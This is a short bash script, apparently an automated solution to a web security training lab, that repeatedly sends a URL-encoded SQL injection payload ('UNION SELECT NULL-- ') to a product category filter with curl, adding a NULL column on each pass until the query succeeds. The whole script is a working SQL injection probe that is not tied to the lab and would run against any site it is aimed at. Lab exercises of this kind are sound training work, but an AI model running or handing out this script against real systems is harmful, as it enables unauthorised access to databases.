#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Lifestyle' UNION SELECT NULL-- ")

while [ 1 ]; do
    output "Trying ${PS_URL}${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}"

    eval_result $PS_URL
    PAYLOAD=$(url_encode "${PAYLOAD%--+},NULL-- ")
done
